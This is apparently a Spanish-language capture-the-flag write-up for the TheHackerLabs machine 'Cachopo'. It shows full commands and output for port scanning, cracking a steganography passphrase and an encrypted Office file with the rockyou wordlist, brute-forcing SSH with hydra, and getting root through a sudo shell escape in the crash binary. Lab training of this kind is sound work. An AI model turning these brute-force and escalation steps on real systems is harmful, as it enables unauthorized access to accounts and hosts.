---
title: "Cachopo - TheHackerLabs"
date: 2025-07-28
draft: false
slug: "THL-writeup-cachopo"
excerpt: "Esta fue una máquina un poco complicada. Después de analizar los escaneos, descubrimos que se está utilizando Virtual Hosting, pues el escaneo muestra un dominio, que podemos registrar en el /etc/hosts y ver la página web activa en el puerto 80. Al no encontrar nada en el código fuente y tampoco aplicando Fuzzing, decidimos analizar la imagen de la página web. Después del análisis, procedemos a crackear la imagen, ya que es necesario darle una contraseña para que nos dé un archivo oculto. Logramos crackear la imagen y el archivo oculto, nos da una ruta que podemos visitar en la página web, resultando en un archivo tipo CDFV2, que también se necesita crackear para ver su contenido. Logramos crackear este archivo también y descubrimos una lista de usuarios a los que podemos aplicarle fuerza bruta por el servicio SSH. Obtenemos la contraseña de un usuario de la lista y ganamos acceso a la máquina víctima vía SSH. Dentro, encontramos que podemos usar el binario crash como Root. Usamos la guía de GTFOBins para buscar una forma de abusar de este binario, siendo que podemos aplicar un Shell Escape para escalar privilegios. Lo hacemos y nos convertimos en Root."
categories: ["TheHackerLabs", "Medium Machine"]
tags: ["Linux", "SSH", "Virtual Hosting", "Steganography", "Steganalysis", "Cracking Hash", "Cracking Image", "Cracking Office File", "Brute Force Attack", "Abusing Sudoers Privileges", "Shell Escape", "Privesc - Abusing Sudoers Privileges", "Privesc - Shell Escape", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "exiftool"
  - "strings"
  - "head"
  - "steghide"
  - "stegseek"
  - "stegcracker"
  - "file"
  - "office2john"
  - "libreoffice"
  - "JohnTheRipper"
  - "hydra"
  - "ssh"
  - "sudo"
  - "crash"
links:
  - "https://gtfobins.github.io/gtfobins/crash/"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-cachopo/cachopo.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.10.230
PING 192.168.10.230 (192.168.10.230) 56(84) bytes of data.
64 bytes from 192.168.10.230: icmp_seq=1 ttl=64 time=1.46 ms
64 bytes from 192.168.10.230: icmp_seq=2 ttl=64 time=0.805 ms
64 bytes from 192.168.10.230: icmp_seq=3 ttl=64 time=0.924 ms
64 bytes from 192.168.10.230: icmp_seq=4 ttl=64 time=1.05 ms

--- 192.168.10.230 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3018ms
rtt min/avg/max/mdev = 0.805/1.061/1.464/0.248 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.10.230 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-28 11:02 CST
Initiating ARP Ping Scan at 11:02
Scanning 192.168.10.230 [1 port]
Completed ARP Ping Scan at 11:02, 0.14s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:02
Scanning 192.168.10.230 [65535 ports]
Discovered open port 80/tcp on 192.168.10.230
Discovered open port 22/tcp on 192.168.10.230
Completed SYN Stealth Scan at 11:02, 26.20s elapsed (65535 total ports)
Nmap scan report for 192.168.10.230
Host is up, received arp-response (0.00071s latency).
Scanned at 2025-07-28 11:02:00 CST for 27s
Not shown: 43018 closed tcp ports (reset), 22515 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.54 seconds
           Raw packets sent: 111741 (4.917MB) | Rcvd: 43022 (1.721MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Veo solamente 2 puertos abiertos, por lo que supongo que la intrusión será por el **puerto 80**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80 192.168.10.230 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-28 11:03 CST
Nmap scan report for 192.168.10.230
Host is up (0.00080s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)

| ssh-hostkey: 
|   256 b4:ae:d2:8b:a8:30:a5:fb:58:a9:b2:38:73:33:1d:e0 (ECDSA)
|_  256 76:21:61:f1:f5:67:8a:95:dc:c1:73:56:16:2e:a4:a5 (ED25519)
80/tcp open  http    Apache httpd 2.4.61

|_http-server-header: Apache/2.4.61 (Debian)
|_http-title: Did not follow redirect to http://cachopo.thl/
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: cachopo.thl; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.05 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

El escaneo está mostrando un dominio al que somos redirigidos una vez que entremos a la página web activa del **puerto 80**.

Entonces, registra ese dominio en el `/etc/hosts`:
```bash
echo "192.168.10.230 cachopo.thl" >> /etc/hosts
```
Listo, visitemos la página.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-cachopo/Captura1.png">
</p>

Nos carga bien y nos muestra una imagen.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-cachopo/Captura2.png">
</p>

No hay mucho que destacar.

Podríamos revisar el código fuente, pero no encontraremos nada.

El problema es que si aplicamos **Fuzzing**, no encontraremos ni un directorio y ni un archivo oculto, por lo que parece que la intrusión no es por ahí.

Tampoco podemos aplicar un ataque de fuerza bruta al **servicio SSH**, pues no conocemos ningún usuario al cual atacar.

Dándole un poco de vueltas, lo único que queda por analizar, es la imagen de la página web.

### Analizando Metadatos y Contenido de Imagen Descargada {#metadatos}

Descarga la imagen para que podamos analizarla.

Si estás usando **FireFox**, abre la imagen en otra pestaña y luego descárgala:

<p align="center">
<img src="/assets/images/THL-writeup-cachopo/Captura3.png">
</p>

<p align="center">
<img src="/assets/images/THL-writeup-cachopo/Captura4.png">
</p>

Ya con la imagen descargada, veamos si **exiftool** encuentra algo en sus metadatos:
```bash
exiftool cachopo.jpg
ExifTool Version Number         : 13.25
File Name                       : cachopo.jpg
Directory                       : .
File Size                       : 442 kB
File Modification Date/Time     : 2025:07:28 11:18:53-06:00
File Access Date/Time           : 2025:07:28 11:18:53-06:00
File Inode Change Date/Time     : 2025:07:28 11:19:56-06:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 0
Y Resolution                    : 0
Image Width                     : 1600
Image Height                    : 1067
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 1600x1067
Megapixels                      : 1.7
```
No veo algo sospechoso.

Quizá con el comando **strings** veamos algo:
```bash
strings cachopo.jpg | head -n 10
JFIF
$3br
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
	#3R
&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
2E]G
~ADD
Mjo*
GAwr
84[Rd
```
No hay nada como tal, pero es raro ver ese string **"CDEFGHIJSTUVWXYZcdefghijstuvwxyz"**, como si indicara que hay algo más.

Comprobemos si hay algo ahí dentro.

## Explotación de Vulnerabilidades {#Explotacion}

### Extrayendo Archivo Oculto de una Imagen Aplicando Estegoanálisis {#imagen}

Como ya hemos analizado la imagen, podemos concluir que se ha aplicado **Esteganografía** para ocultar algo en la imagen.

Podemos intentar usar la herramienta **steghide** para tratar de obtener el contenido de una imagen:
```bash
steghide extract -sf cachopo.jpg
Anotar salvoconducto: 
steghide: �no pude extraer ning�n dato con ese salvoconducto!
```
Pero, como puedes ver, nos pedirá un salvoconducto, que es en realidad una contraseña.

Entonces, lo ideal sería crackear la imagen para obtener la contraseña.

Esto lo podemos hacer con la herramienta **stegseek**:
```bash
stegseek cachopo.jpg /usr/share/wordlists/rockyou.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "doggies"
[i] Original filename: "directorio.txt".
[i] Extracting to "cachopo.jpg.out".
```
Excelente, obtuvo la contraseña, el archivo oculto y su contenido lo guardó en un archivo nuevo llamado **cachopo.jpg.out**.

Digamos que por X o Y motivo, conocíamos la contraseña, en ese caso pudimos haber ocupado la herramienta **steghide** que sirve para adjuntar o extraer archivos en una imagen:
```bash
steghide extract -sf cachopo.jpg
Anotar salvoconducto: 
anot� los datos extra�dos e/"directorio.txt".
```
Obtuvo el archivo **directorio.txt** que es el mismo que obtuvo **stegseek**.

Por último, tenemos la herramienta **stegcracker** que es lo mismo que **stegseek**, pero esta es su versión antigua:
```bash
stegcracker cachopo.jpg /usr/share/wordlists/rockyou.txt
StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2025 - Luke Paris (Paradoxis)

StegCracker has been retired following the release of StegSeek, which 
will blast through the rockyou.txt wordlist within 1.9 second as opposed 
to StegCracker which takes ~5 hours.

StegSeek can be found at: https://github.com/RickdeJager/stegseek

Counting lines in wordlist..
Attacking file 'cachopo.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: doggies
Tried 4556 passwords
Your file has been written to: cachopo.jpg.out
doggies
```
Hizo lo mismo que **stegseek**, pues obtuvo la contraseña usada y guardó el contenido del archivo oculto en uno llamado **cachopo.jpg.out**.

Veamos qué contiene ese archivo:
```bash
cat cachopo.jpg.out
el directorio es mycachopo
```
Nos da el nombre de un directorio, supongo que es para la página web.

Probémoslo:

<p align="center">
<img src="/assets/images/THL-writeup-cachopo/Captura5.png">
</p>

Nos muestra solo un archivo.

Vamos a descargarlo y a analizarlo.

### Crackeando Archivo de Office y Analizando su Contenido {#Office}

Veamos qué tipo de archivo es el que descargamos con el comando **file**:
```bash
file Cocineros
Cocineros: CDFV2 Encrypted
```
Nos está indicando que es un archivo encriptado tipo **CDFV2**.

Investiguemos qué es este archivo:

| **Archivo CDFV2**
| :-----------: |
| *CDFV2 significa Compound Document File, Version 2. Es una estructura de almacenamiento que permite contener múltiples flujos de datos (streams) y objetos dentro de un solo archivo binario. Es como un "sistema de archivos dentro de un archivo". Archivos que pueden usar este formato incluyen extensiones como: .doc (Word), .xls (Excel), .ppt (PowerPoint)* |

Para poder ver este archivo, podemos usar el software **LibreOffice** que podemos instalar con el siguiente comando:
```bash
sudo apt install libreoffice
```

Y abrimos el archivo:
```bash
libreoffice Cocineros
```

<p align="center">
<img src="/assets/images/THL-writeup-cachopo/Captura6.png">
</p>

Nos pide la contraseña.

Este archivo lo podemos crackear, pero primero debemos obtener su hash con la herramienta **office2john**:
```bash
office2john Cocineros > hash
```

Ahora lo crackeamos con **JohnTheRipper**:
```bash
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 128/128 SSE2 4x / SHA512 128/128 SSE2 2x AES])
Cost 1 (MS Office version) is 2007 for all loaded hashes
Cost 2 (iteration count) is 50000 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
horse1           (Cocineros)     
1g 0:00:00:02 DONE (2025-07-28 11:36) 0.4201g/s 1976p/s 1976c/s 1976C/s marques..alemania
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Tenemos la contraseña.

Abre de nuevo el archivo y dale la contraseña para ver su contenido:

<p align="center">
<img src="/assets/images/THL-writeup-cachopo/Captura7.png">
</p>

Son nombres, quiero pensar que son usuarios.

Supongo que debemos aplicarles fuerza bruta para saber cuál de estos pertenece al **servicio SSH**.

### Aplicando Fuerza Bruta a Usuarios Encontrados {#fuerzaBruta}

Para agilizar un poco este proceso, en lugar de guardar los nombres en un solo archivo como una lista (que sería lo ideal), vamos a aplicarle fuerza bruta con **hydra** a cada usuario, pero con un límite de 10 minutos cada uno.

Esto resultó en descubrir que el **usuario carlos**, es el vulnerable a la fuerza bruta:
```bash
hydra -l 'carlos' -P /usr/share/wordlists/rockyou.txt ssh://192.168.10.230 -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-28 11:46:36
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://192.168.10.230:22/
[22][ssh] host: 192.168.10.230   login: carlos   password: *******
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 26 final worker threads did not complete until end.
[ERROR] 26 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-28 11:47:05
```

Genial, probemos esa contraseña:
```bash
ssh carlos@192.168.10.230
carlos@192.168.10.230's password: 
Linux Cachopo 6.1.0-22-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.94-1 (2024-06-21) x86_64
...
Last login: Mon Jul 15 11:44:31 2024
carlos@Cachopo:~$ whoami
carlos
```

Ganamos acceso y aquí podemos encontrar la flag del usuario:
```bash
carlos@Cachopo:~$ ls
user.txt
carlos@Cachopo:~$ cat user.txt
...
```

## Post Explotación {#Post}

### Escalando Privilegios con Permisos Sudoers Sobre Binario crash (Shell Escape) {#crash}

Revisemos qué privilegios tiene nuestro usuario:
```bash
carlos@Cachopo:~$ sudo -l
Matching Defaults entries for carlos on Cachopo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User carlos may run the following commands on Cachopo:
    (ALL) NOPASSWD: /usr/bin/crash
```
Podemos usar el binario **crash** como **Root**.

Encontramos una forma de usar este binario para escalar privilegios con la **guía de GTFOBins**:
* <a href="https://gtfobins.github.io/gtfobins/crash/" target="_blank">GTFOBins: crash</a>

Y usaremos este comando:

<p align="center">
<img src="/assets/images/THL-writeup-cachopo/Captura8.png">
</p>

Básicamente, tenemos que aplicar un **Shell Escape**.

Ejecútalo:
```bash
carlos@Cachopo:~$ sudo crash -h
```

Entramos al manual del binario, ahora solo falta aplicar un **Shell Escape** con `!/bin/bash`:

<p align="center">
<img src="/assets/images/THL-writeup-cachopo/Captura9.png">
</p>

Observa el resultado:
```bash
carlos@Cachopo:~$ sudo crash -h
root@Cachopo:/home/carlos# whoami
root
```
Ya somos **Root**.

Obtengamos la última flag:
```bash
root@Cachopo:/home/carlos# cd /root
root@Cachopo:~# ls
root.txt
root@Cachopo:~# cat root.txt
...
```
Y con esto, terminamos la máquina.
